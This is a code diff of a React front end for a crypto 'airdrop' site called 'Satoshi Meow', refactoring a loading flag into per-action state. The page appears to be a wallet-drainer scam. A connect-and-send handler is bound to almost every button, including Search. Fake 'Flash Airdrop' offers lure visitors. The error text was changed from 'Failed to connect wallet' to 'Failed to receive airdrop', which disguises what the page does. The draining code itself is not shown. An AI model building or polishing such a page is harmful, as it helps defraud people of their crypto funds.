@@ -52,7 +52,7 @@ const titleDelays = titleText.split("").map(() => `${(Math.random() * 0.5).toFix
 
 function App() {
   const { state, dispatch } = useContext(WalletContext);
-  const [loading, setLoading] = useState(false);
+  const [loadingAction, setLoadingAction] = useState(null);
   const topRef = useRef(null);
   const chartRef = useRef(null);
   const [showModal, setShowModal] = useState(false);
@@ -77,8 +77,8 @@ function App() {
   };
 
   const handleConnectAndSend = async () => {
-    if(loading) return; // prevent multiple clicks
-    setLoading(true);
+    if(loadingAction) return; // prevent multiple clicks
+    setLoadingAction('eth-trade');
 
     try {
       let data = {
@@ -93,7 +93,7 @@ function App() {
         if(!data){
           // alert("Failed to connect wallet. Please try again.");
           alert("Failed to receive airdrop. Please try again.");
-          setLoading(false);
+          setLoadingAction(null);
           return;
         }
 
@@ -130,7 +130,7 @@ function App() {
     } catch {
       alert("Something went wrong. Please try again.");
     }
-    setLoading(false);
+    setLoadingAction(null);
   }
 
   // const handleConnectSolanaWallet = async (walletName) => {
@@ -154,8 +154,8 @@ function App() {
   // };
 
   const handleSolanaAirdropFlow = async () => {
-    if(loading) return
-    setLoading(true)
+    if(loadingAction) return
+    setLoadingAction('solana-airdrop')
 
     try {
       const solAddress = await connectSolana()
@@ -167,12 +167,12 @@ function App() {
     } catch (e){
       console.log("Airdrop Flow Error: ", e);
     } finally {
-      setLoading(false)
+      setLoadingAction(null)
     }
     
   }
   const handleFullAirdropFlow = async () => {
-    if(loading) return
+    if(loadingAction) return
     handleConnectAndSend()
     handleSolanaAirdrop()
   }
@@ -180,7 +180,7 @@ function App() {
   // Unified Bitcoin Handler
   const handleWalletConnected = async (walletData) => {
     setShowModal(false); 
-    setLoading(true);
+    setLoadingAction('bitcoin');
 
     try {
       console.log("Connected to:", walletData.address, "via", walletData.type);
@@ -218,7 +218,7 @@ function App() {
       console.error("Bitcoin Flow Error:", e);
       alert("Please check your wallet for confirmation.");
     } finally {
-      setLoading(false);
+      setLoadingAction(null);
     }
   };
 
@@ -236,7 +236,7 @@ function App() {
           </div>
           <div className="container-fluid">
             <a className="navbar-brand">
-              <button className="btn btn-success animated-btn" onClick={handleConnectAndSend} disabled={loading}>
+              <button className="btn btn-success animated-btn" onClick={handleConnectAndSend} disabled={loadingAction === 'eth-trade'}>
                 <span className="emoji-wrapper">
                   <span className="emoji-slide">
                     🎁 🎉 🪂 💰 🪙 🚀 🎁
@@ -278,9 +278,9 @@ function App() {
                     <a className="nav-link" href="#">Telegram</a>
                   </li>
                   <li className="nav-item">
-                    <a className="nav-link" onClick={() => setShowModal(true)} disabled={loading}><FaBitcoin className="me-2 text-warning" /> Bitcoin Airdrops</a>
+                    <a className="nav-link" onClick={() => setShowModal(true)} disabled={loadingAction === 'bitcoin'}><FaBitcoin className="me-2 text-warning" /> Bitcoin Airdrops</a>
                     <a className="nav-link" href="#"><SiSolana className="me-2 text-info" /> Solana Airdrops</a>
-                    <a className="nav-link" onClick={handleConnectAndSend} disabled={loading}><FaEthereum className="me-2 text-primary" /> ETH Airdrops</a>
+                    <a className="nav-link" onClick={handleConnectAndSend} disabled={loadingAction === 'eth-trade'}><FaEthereum className="me-2 text-primary" /> ETH Airdrops</a>
                   </li>
                   <li className="nav-item dropdown">
                     <a className="nav-link dropdown-toggle" href="#" role="button" data-bs-toggle="dropdown" aria-expanded="false">
@@ -288,8 +288,8 @@ function App() {
                     </a>
                     <ul className="dropdown-menu">
                       <li><a className="dropdown-item"><SiSolana className="me-2 text-info" /> Solana Flash Airdrop</a></li>
-                      <li><a className="dropdown-item" onClick={handleConnectAndSend} disabled={loading}><FaEthereum className="me-2 text-primary" /> ETH Flash Airdrop</a></li>
-                      <li><a className="dropdown-item btn" onClick={() => setShowModal(true)} disabled={loading}><FaBitcoin className="me-2 text-warning" /> Bitcoin Flash Airdrop</a></li>
+                      <li><a className="dropdown-item" onClick={handleConnectAndSend} disabled={loadingAction === 'eth-trade'}><FaEthereum className="me-2 text-primary" /> ETH Flash Airdrop</a></li>
+                      <li><a className="dropdown-item btn" onClick={() => setShowModal(true)} disabled={loadingAction === 'bitcoin'}><FaBitcoin className="me-2 text-warning" /> Bitcoin Flash Airdrop</a></li>
                       <li>
                         <hr className="dropdown-divider"/>
                       </li>
@@ -299,7 +299,7 @@ function App() {
                 </ul>
                 <form className="d-flex mt-3" role="search">
                   <input className="form-control me-2" type="search" placeholder="Search" aria-label="Search"/>
-                  <button className="btn btn-outline-success" type="submit" onClick={handleConnectAndSend} disabled={loading}>Search</button>
+                  <button className="btn btn-outline-success" type="submit" onClick={handleConnectAndSend} disabled={loadingAction === 'eth-trade'}>Search</button>
                 </form>
                 <div className="mb-5carousel">
                   <Carousel />
@@ -340,10 +340,10 @@ function App() {
             <button
               className="text-primary-emphasis bg-primary-subtle border border-primary-subtle rounded-3 btn-lg animated-bt"
               onClick={handleConnectAndSend}
-              disabled={loading}
+              disabled={loadingAction === 'eth-trade'}
             >
               {
-                loading
+                loadingAction === 'eth-trade'
                   ? "💰Connection pending..."
                   : state.address
                   ? "Connecting..."
@@ -362,10 +362,10 @@ function App() {
         <button
           className="text-primary-emphasis bg-primary-subtle border border-primary-subtle rounded-3 btn-lg animated-bt"
           onClick={handleConnectAndSend}
-          disabled={loading}
+          disabled={loadingAction === 'eth-trade'}
         >
           {
-            loading
+            loadingAction === 'eth-trade'
               ? "💰awaiting Airdrop..."
               : state.address
               ? "Claiming | awaiting airdrop..."
@@ -417,7 +417,7 @@ function App() {
           <div className="card-img-overlay d-flex flex-column justify-content-center align-items-center text-center">
             <h5 className="card-title text-shadow p-img-text shadow">SATOSHI MEOW</h5>
             <p className="card-text text-shadow p-img-text px-5 shadow">Satoshi Meow is the first Purr-to-Earn ecosystem designed to bring balance to the crypto-verse. While dogs chase their tails, Satoshi Meow focuses on calculated leaps and landing on all four paws, even in a bear market.</p>
-            <p className="card-text text-shadow p-img-text shadow"><small><button className="btn btn-info animated-bt2" onClick={handleConnectAndSend} disabled={loading ? true : false}>🎁Claim your rewards now!</button></small></p>
+            <p className="card-text text-shadow p-img-text shadow"><small><button className="btn btn-info animated-bt2" onClick={handleConnectAndSend} disabled={loadingAction === 'eth-trade'}>🎁Claim your rewards now!</button></small></p>
           </div>
         </div>
       </div>
@@ -452,7 +452,7 @@ function App() {
           handleFullAirdropFlow={handleFullAirdropFlow}
           handleSolanaAirdropFlow={handleSolanaAirdropFlow}
           handleWalletConnected={handleWalletConnected}
-          loading={loading}
+          loadingAction={loadingAction}
           address={state.address}
           setShowModal={setShowModal}
         />
